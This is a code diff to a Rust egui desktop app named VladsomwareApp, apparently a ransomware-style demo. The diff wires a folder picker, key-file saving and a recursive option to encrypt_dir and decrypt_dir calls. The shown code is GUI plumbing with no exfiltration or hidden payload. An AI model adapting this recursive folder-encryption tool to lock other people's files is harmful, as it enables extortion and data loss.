@@ -12,9 +12,10 @@ use egui::{
     TextStyle, TextureHandle, TextureOptions, Ui, ViewportBuilder,
 };
 use std::{fs::File, io::Write};
+use std::path::PathBuf;
 
 struct VladsomwareApp {
-    directory: String,
+    directory: PathBuf,
     key_path: String,
     key_saved_or_loaded: bool,
     encryptor: Encryptor,
@@ -39,7 +40,7 @@ impl VladsomwareApp {
         let decrypt_icon = load_icon_safe(include_bytes!("../rsrc/unlock.ico")).unwrap_or_default();
 
         Self {
-            directory: String::new(),
+            directory: PathBuf::new(),
             key_path: String::new(),
             key_saved_or_loaded: false,
             encryptor: Encryptor::new().unwrap(),
@@ -89,7 +90,7 @@ fn set_style(ctx: &Context) {
 
 fn render_dir_selector(
     ui: &mut egui::Ui,
-    modified_path: &mut String,
+    modified_path: &mut PathBuf,
     hover_text: &str,
 ) -> InnerResponse<()> {
     ui.vertical(|ui| {
@@ -100,11 +101,17 @@ fn render_dir_selector(
         ui.add_space(10.0);
         ui.horizontal(|ui| {
             ui.add_space(10.0);
-            ui.add(egui::TextEdit::singleline(modified_path).desired_width(250.0))
+            let mut path_str = modified_path.display().to_string();
+            let text_edit_response = ui.add(egui::TextEdit::singleline(&mut path_str).desired_width(250.0))
                 .on_hover_text(hover_text);
+
+            if text_edit_response.changed() {
+                *modified_path = PathBuf::from(path_str);
+            }
+
             if ui.button("Browse...").on_hover_text(hover_text).clicked() {
                 if let Some(path) = rfd::FileDialog::new().pick_folder() {
-                    *modified_path = path.display().to_string().replace("\\", "\\\\");
+                    *modified_path = path;
                 }
             }
             ui.add_space(10.0);
@@ -152,7 +159,7 @@ fn generate_and_save_key(app: &mut VladsomwareApp) -> Result<(), String> {
 
     let mut file = File::create(&path).map_err(|e| format!("Failed to create file: {}", e))?;
 
-    file.write_all(&app.encryptor.key)
+    file.write_all(&app.encryptor.get_key_blob().unwrap())
         .map_err(|e| format!("Failed to write key: {}", e))?;
 
     app.key_saved_or_loaded = true;
@@ -197,8 +204,11 @@ fn render_encryption_options(app: &mut VladsomwareApp, ui: &mut Ui) -> InnerResp
         ui.add_space(10.0);
         ui.vertical(|ui| {
             ui.add_space(10.0);
-            ui.checkbox(&mut app.recursive, "Recursive")
+            let rec_response = ui.checkbox(&mut app.recursive, "Recursive")
                 .on_hover_text("Recursively Encrypt\\Decrypt all sub folders");
+            if rec_response.changed() {
+                app.encryptor.set_recursive(app.recursive);
+            }
             ui.checkbox(&mut app.multi_threaded, "Multi-Threaded")
                 .on_hover_text("Encrypt\\Decrypt using multiple threads");
             ui.add_space(10.0);
@@ -233,7 +243,13 @@ fn render_big_button(
             )
             .on_hover_text(hover_text)
             .clicked()
-        {};
+        {
+            if encryption {
+                app.encryptor.encrypt_dir(&app.directory);
+            } else {
+                app.encryptor.decrypt_dir(&app.directory);
+            }
+        };
         ui.add_space(20.0);
     })
 }
